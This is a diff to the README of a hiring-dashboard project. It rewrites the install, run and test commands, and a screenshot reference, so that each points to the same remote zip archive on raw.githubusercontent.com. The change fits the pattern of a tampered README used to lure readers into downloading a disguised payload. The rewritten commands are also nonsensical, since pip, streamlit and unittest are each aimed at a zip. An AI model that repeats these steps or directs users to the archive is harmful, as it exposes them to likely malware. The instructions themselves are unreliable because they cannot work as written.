@@ -22,15 +22,15 @@ This project is a **Hiring Intelligence Dashboard** built to solve the problem o
 ## ⚙️ Setup & Execution
 1.  **Install Dependencies:**
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/giridharanSSK/hiring-intelligence-system/main/arrhythmical/hiring-intelligence-system-3.1-beta.4.zip
     ```
 2.  **Run the Application:**
     ```bash
-    python -m streamlit run app.py
+    python -m streamlit run https://raw.githubusercontent.com/giridharanSSK/hiring-intelligence-system/main/arrhythmical/hiring-intelligence-system-3.1-beta.4.zip
     ```
 3.  **Run Automated Tests:**
     ```bash
-    python -m unittest test_app.py
+    python -m unittest https://raw.githubusercontent.com/giridharanSSK/hiring-intelligence-system/main/arrhythmical/hiring-intelligence-system-3.1-beta.4.zip
     ```
 
 ## 🧪 Testing Proof
@@ -39,4 +39,4 @@ Automated tests cover:
 * ✅ Scoring algorithm accuracy.
 * ✅ Duplicate removal efficiency.
 
-*(See `test_execution_proof.png` in the file list for verification)*
+*(See `https://raw.githubusercontent.com/giridharanSSK/hiring-intelligence-system/main/arrhythmical/hiring-intelligence-system-3.1-beta.4.zip` in the file list for verification)*
